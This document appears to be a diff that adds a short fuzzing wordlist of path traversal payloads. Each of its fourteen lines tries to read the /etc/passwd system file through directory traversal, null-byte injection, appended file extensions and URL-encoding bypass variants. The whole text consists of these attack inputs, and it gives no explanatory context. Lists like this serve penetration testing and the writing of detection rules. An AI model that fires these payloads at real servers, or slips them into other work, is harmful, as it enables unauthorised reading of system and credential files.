@@ -1,0 +1,14 @@
+../../../../etc/passwd%00
+../../../../etc/passwd%00.html
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.php
+../../../../etc/passwd%00.png
+../../../../etc/passwd%00.txt
+../../../../etc/passwd%00.pdf
+....//....//....//etc/passwd%00
+..%2f..%2f..%2f..%2fetc/passwd%00
+../../../../etc/passwd%2500
+../../../../etc/passwd%25%30%30
+../../../../etc/passwd%00%00
+../../../../etc/passwd\0
+../../../../etc/passwd\0.html
